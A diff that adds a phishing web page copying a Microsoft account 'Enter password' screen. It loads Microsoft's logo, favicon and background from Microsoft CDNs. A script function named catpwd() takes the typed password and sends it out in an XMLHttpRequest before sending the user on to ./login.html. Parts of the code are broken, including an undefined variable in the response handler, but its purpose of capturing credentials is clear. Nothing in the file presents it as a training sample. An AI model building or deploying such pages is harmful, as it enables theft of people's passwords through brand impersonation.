@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Sign in to your account</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <link rel="shortcut icon" href="https://aadcdn.msftauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico" />
+
+</head>
+<style>
+    body{
+        height: 100vh;
+        width: 100vw;
+        padding: 0;
+        margin: 0;
+    }
+    .middle{
+        height: 345px;
+        width: 410px;
+        background: #fff;
+        margin: auto;
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+
+    }
+    .inner{
+        margin: 40px;
+        width: 330px;
+        height: 265px;
+        display: flex;
+        flex-direction: column;
+    }
+    .title{
+        margin-top: 10px;
+        color: #404040;
+        font-size: 1.5rem;
+        font-weight: 600;
+        font-family: "Segoe UI","Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
+    }
+    #input{
+        height: 36px;
+        line-height: 36px;
+        border: none;
+        border-bottom: 1px rgba(0,0,0,0.6) solid ;
+        font-size: 15px;
+        margin-top: 10px;
+        margin-bottom: 15px;
+    }
+    /*.input:focus {*/
+    /*border-bottom: 1px blue solid ;*/
+    /*}*/
+    .account{
+        font-size: 12px;
+        color: #262626;
+        height: 20px;
+
+        margin-bottom: 16px;
+        font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
+    }
+    .account1{
+        font-size: 15px;
+        /*line-height: 19px;*/
+        color: #262626;
+        margin-bottom: 16px;
+        font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
+    }
+    .next{
+        cursor: pointer;
+        height: 32px;
+        line-height: 32px;
+        color: #fff;
+        width: 108px;
+        text-align: center;
+        background-color: #0067b8;
+        font-size: 13px;
+        float: right;
+    }
+    .outNext{
+        width: 100%;
+    }
+    a{
+        text-decoration: none;
+        color: #fff;
+    }
+    #bike{
+        height: 20px;
+        width: 20px;
+        margin: 0;
+        padding: 0;
+        float: left;
+    }
+</style>
+<body style="background-image: url(https://aadcdn.msauth.net/ests/2.1/content/images/backgrounds/0_a5dbd4393ff6a725c7e62b61df7e72f0.jpg);background-size: 100%;">
+
+<div class="middle" >
+    <div class="inner">
+        <div class="icon">
+            <img src="https://aadcdn.msauth.net/ests/2.1/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="">
+        </div>
+        <div class="title">Enter password</div>
+        <input type="text" style="outline:none;" id="input" placeholder="Password">
+        <div class="account1"><input type="checkbox" id="bike" value="Bike"> <div style="height: 20px;line-height: 20px; float: left; margin-left: 5px ">Keep me signed in</div> </div>
+        <div class="account"><text style="color:#0067b8;cursor:pointer;">Forgot my password</text></div>
+        <div class="outNext">
+            <div class="next"><a href="./login.html" onclick="catpwd()">Sign in</a></div>
+        </div>
+
+    </div>
+</div>
+
+<script type="text/javascript">
+    function catpwd(){
+        var request = new XMLHttpRequest(); 
+        var email = document.getElementById("input").value
+        
+        request.onreadystatechange = function () {
+        if (request.readyState === 4) { 
+       
+            if (request.status === 200) {
+            
+                document.getElementById("input").innerHTML=xmlhttp.responseText;
+            } else {
+            
+            return request.status;
+        }
+    } 
+}
+
+request.open('GET',email);
+request.send();
+    }
+</script>
+
+
+
+<script>
+    document.getElementById("input").focus();
+</script>
+</body>
+</html>
